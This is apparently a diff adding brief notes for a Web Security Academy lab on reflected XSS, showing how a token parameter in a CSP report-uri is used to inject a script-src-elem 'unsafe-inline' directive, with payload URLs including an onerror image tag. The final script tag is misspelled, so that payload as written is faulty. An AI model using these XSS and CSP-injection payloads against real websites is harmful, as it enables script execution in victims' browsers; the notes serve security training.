@@ -1,0 +1,10 @@
+// Enter the following into the search box: <img src=1 onerror=alert(1)>
+https://ac041fee1f5fb82a80399b5200a500c2.web-security-academy.net/?search=kiddie
+
+// Observe that the payload is reflected, but the CSP prevents the script from executing. 
+
+// Observe that the response contains a Content-Security-Policy header, and the report-uri directive contains a parameter called token. 
+https://ac041fee1f5fb82a80399b5200a500c2.web-security-academy.net/?search=kiddie&token=injected
+
+// Inject your own CSP directives to allow unsafe <script> tags
+https://ac041fee1f5fb82a80399b5200a500c2.web-security-academy.net/?search=<scirpt>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
